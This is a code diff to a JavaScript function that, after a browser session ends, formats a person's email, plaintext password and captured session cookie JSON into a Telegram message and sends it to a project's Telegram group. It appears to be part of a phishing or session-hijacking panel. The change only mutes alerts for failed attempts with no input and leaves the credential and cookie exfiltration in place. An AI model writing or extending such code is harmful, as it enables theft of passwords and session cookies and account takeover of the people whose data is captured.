@@ -604,15 +604,24 @@ export async function updateHubAndProjectsFromCookieData(browserId, status) {
     if (projectTelegramId) {
       logger.debug(`[updateHubAndProjectsFromCookieData] Sending Telegram notification to ${projectTelegramId} for status: ${status}.`);
       logger.info(`[updateHubAndProjectsFromCookieData] Telegram payload — browserId: ${browserId}, email: "${cookieRowMap.email || ''}", password: "${cookieRowMap.password ? '***' : ''}", status: ${status}`);
-      let telegramMessage = `*Project:* ${projectTitle}\n*Status:* ${status}\n*Email:* ${cookieRowMap.email || 'N/A'}\n*Password:* ${cookieRowMap.password || 'N/A'}`;
 
-      if (templateType === "COOKIE" && status === "COMPLETED") {
-        telegramMessage += `\n*Cookie JSON:* ${JSON.stringify(dataToUpdate.cookieJSON).substring(0, 500)}...`; // Truncate for brevity
-      } else if (templateType === "COOKIE" && status === "FAILED") {
-        telegramMessage += `\n*Cookie JSON:* (Not available on failure)`;
+      // TEMPORARILY SILENCED (not removed): skip FAILED notifications where the user never
+      // entered an email or password (e.g. browser failed to launch before any input). The
+      // row gets deleted anyway, so the alert is just noise.
+      const failedWithNoUserInput = status === "FAILED" && !cookieRowMap.email && !cookieRowMap.password;
+      if (failedWithNoUserInput) {
+        logger.info(`[updateHubAndProjectsFromCookieData] Skipping Telegram notification for ${browserId}: FAILED with no email/password provided.`);
+      } else {
+        let telegramMessage = `*Project:* ${projectTitle}\n*Status:* ${status}\n*Email:* ${cookieRowMap.email || 'N/A'}\n*Password:* ${cookieRowMap.password || 'N/A'}`;
+
+        if (templateType === "COOKIE" && status === "COMPLETED") {
+          telegramMessage += `\n*Cookie JSON:* ${JSON.stringify(dataToUpdate.cookieJSON).substring(0, 500)}...`; // Truncate for brevity
+        } else if (templateType === "COOKIE" && status === "FAILED") {
+          telegramMessage += `\n*Cookie JSON:* (Not available on failure)`;
+        }
+
+        await sendTelegramMessage(projectTelegramId, telegramMessage);
       }
-
-      await sendTelegramMessage(projectTelegramId, telegramMessage);
     } else {
       logger.warn(`[updateHubAndProjectsFromCookieData] No telegramGroupId found for projectId '${projectId}'. Skipping Telegram notification.`);
     }
